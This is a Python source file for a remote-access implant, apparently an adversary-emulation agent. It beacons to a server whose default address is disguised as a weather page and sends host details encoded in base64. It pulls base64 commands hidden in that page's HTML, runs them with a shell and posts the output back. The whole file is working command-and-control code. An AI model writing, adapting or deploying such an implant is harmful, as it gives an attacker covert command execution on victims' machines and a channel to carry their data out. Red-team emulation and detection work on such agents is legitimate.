import argparse
import json
import os
import platform
import subprocess
import socket
import time
from base64 import b64encode, b64decode

import requests
from bs4 import BeautifulSoup


class OperationLoop:

    def __init__(self, profile):
        self.profile = profile

    def start(self):
        while True:
            try:
                self.profile['results'] = []
                print('[*] Sending beacon for %s' % self.profile.get('paw', 'unknown'))
                beacon = self._send_beacon()
                instructions = self._next_instructions(beacon=beacon)
                sleep = self._handle_instructions(instructions)
                time.sleep(sleep)
            except Exception as e:
                print('[-] Operation loop error: %s' % e)
                time.sleep(30)

    """ PRIVATE """

    def _handle_instructions(self, instructions):
        self.profile['paw'] = instructions['paw']
        for instruction in json.loads(instructions['instructions']):
            result, seconds = self._execute_instruction(json.loads(instruction))
            self.profile['results'].append(result)
            self._send_beacon()
            self.profile['results'] = []
            time.sleep(seconds)
        else:
            self._send_beacon()
        return instructions['sleep']

    def _next_instructions(self, beacon):
        soup = BeautifulSoup(beacon.content, 'html.parser')
        instructions = soup.find(id='instructions')
        return json.loads(self._decode_bytes(instructions.contents[0]))

    def _send_beacon(self):
        website = '%s?profile=%s' % (self.profile['server'], self._encode_string(json.dumps(self.profile)))
        return requests.get(website)

    def _execute_instruction(self, i):
        print('[+] Running instruction: %s' % i['id'])
        cmd = self._decode_bytes(i['command'])
        output = subprocess.check_output(cmd, shell=True, timeout=i['timeout'])
        return dict(output=self._encode_string(output.decode('utf-8', errors='ignore')), pid=os.getpid(), status=0, id=i['id']), i['sleep']

    @staticmethod
    def _decode_bytes(s):
        return b64decode(s).decode('utf-8', errors='ignore').replace('\n', '')

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s.encode()), 'utf-8')


def build_profile(server_addr):
    return dict(
        server=server_addr,
        host=socket.gethostname(),
        platform=platform.system().lower(),
        executors=['sh'],
        pid=os.getpid()
    )


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Start here')
    parser.add_argument('-W', '--website', required=False, default='http://localhost:8888/weather')
    args = parser.parse_args()
    try:
        p = build_profile('%s' % args.website)
        OperationLoop(profile=p).start()
    except Exception as e:
        print('[-] Web page may not be accessible, or: %s' % e)
